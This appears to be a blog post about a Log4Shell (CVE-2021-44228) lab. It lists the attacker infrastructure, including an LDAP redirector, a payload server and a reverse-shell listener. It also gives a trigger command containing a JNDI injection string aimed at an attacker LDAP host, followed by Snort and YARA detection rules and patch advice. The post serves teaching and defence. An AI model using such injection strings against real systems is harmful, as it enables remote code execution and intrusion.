---
title: "[EXPLOIT] Log4Shell: JNDI Injection & RCE Lab"
date: 2026-01-24
categories: ["pro-suite"]
tags: ["java", "exploit-dev", "jndi", "ldap", "cyber-security"]
description: "High-fidelity replication of CVE-2021-44228 featuring LDAP referral redirection and remote code execution."
---

<div class="terminal-header-line"></div>

### **⚡ LOG4SHELL (CVE-2021-44228) PoC LAB**

```text
██╗      ██████╗  ██████╗ ██╗  ██╗███████╗██╗  ██╗███████╗██╗     ██╗     
██║     ██╔═══██╗██╔════╝ ██║  ██║██╔════╝██║  ██║██╔════╝██║     ██║     
██║     ██║   ██║██║  ███╗███████║███████╗███████║█████╗  ██║     ██║     
██║     ██║   ██║██║   ██║╚════██║╚════██║██╔══██║██╔══╝  ██║     ██║     
███████╗╚██████╔╝╚██████╔╝     ██║███████║██║  ██║███████╗███████╗███████╗
╚══════╝ ╚═════╝  ╚═════╝      ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

                             ██████╗  ██████╗  ██████╗
                             ██╔══██╗██╔═══██╗██╔════╝
                             ██████╔╝██║   ██║██║     
                             ██╔═══╝ ██║   ██║██║     
                             ██║     ╚██████╔╝╚██████╔╝
                             ╚═╝      ╚═════╝  ╚═════╝ 

```

> **Exploitation Profile:** JNDI Injection & LDAP/RMI Referral Redirection.
> **Target Environment:** Containerized OpenJDK 8 / Log4j v2.14.1.
> **Objective:** Demonstration of Remote Code Execution (RCE) via malicious bytecode.

---

### **📋 PROJECT CAPABILITIES**

This environment provides a containerized sandbox to replicate the full attack lifecycle:

* **JNDI Injection:** Vulnerable entry point via un-sanitized logging of user input.
* **LDAP Referral:** Redirection of requests via the Marshalsec toolset.
* **Remote Class Loading:** HTTP-based delivery of `Exploit.class` payloads.
* **Evasion Testing:** Validating bypasses for `TrustURLCodebase` and `FormatMsgNoLookups`.

---

## I. INFRASTRUCTURE ARCHITECTURE

### **1. Attacker Infrastructure**

| Component | Protocol | Port | Function |
| --- | --- | --- | --- |
| **LDAP Redirector** | LDAP | 1389 | Redirects JNDI requests to the exploit. |
| **HTTP Payload Server** | HTTP | 8888 | Hosts the compiled Java bytecode. |
| **Netcat Listener** | TCP | 9001 | Final destination for the reverse shell. |

### **2. Victim Instance**

* **Log4j v2.14.1:** Specifically targeted vulnerable library version.
* **VulnerableLog.java:** Implementation logging raw `${jndi:...}` strings.

---

## II. OPERATIONAL EXECUTION

### **Triggering the Exploit**

The PoC is triggered by passing a malicious JNDI string as a lookup:

```bash
java -Dlog4j2.formatMsgNoLookups=false \
     -Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
     -cp ".:log4j-api-2.14.1.jar:log4j-core-2.14.1.jar" \
     VulnerableLog '${jndi:ldap://172.17.0.1:1389/Exploit}'

```

---

## III. DETECTION & DEFENSIVE MONITORING

### **1. Network Signature (Snort)**

```snort
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"ET EXPLOIT Possible Log4j RCE Attempt (jndi)"; content:"jndi|3a|"; nocase; sid:2034647; rev:1;)

```

### **2. Endpoint Detection (YARA)**

```yara
rule Log4Shell_PoC_JNDI {
    meta:
        description = "Detects JNDI lookup strings in logs"
    strings:
        $jndi = / \$\{jndi:(ldap|rmi|dns|nis|iiop|corba|lds):/ i
        $obfuscated = /\$\{\$\{[^}]+\}ndi:/ i
    condition:
        any of them
}

```

---

## IV. INCIDENT RESPONSE (IR) MATRIX

| Phase | Technique | MITRE ATT&CK |
| --- | --- | --- |
| **Initial Access** | Exploit Public-Facing App | T1190 |
| **Execution** | Command and Scripting Interpreter | T1059 |
| **Command & Control** | App Layer Protocol (LDAP) | T1071.003 |
| **Exfiltration** | Non-Application Layer Protocol | T1048 |

---

### **🛡️ MITIGATION & HARDENING**

1. **Update:** Patch to Log4j **v2.17.1** or higher immediately.
2. **Disable Lookups:** Set the JVM flag `-Dlog4j2.formatMsgNoLookups=true`.
3. **Class Sanitization:** Remove `JndiLookup.class` from the `log4j-core` JAR.

> **STATUS:** MISSION READY **DOC_ID:** LOG4SHELL-POC-2026

---
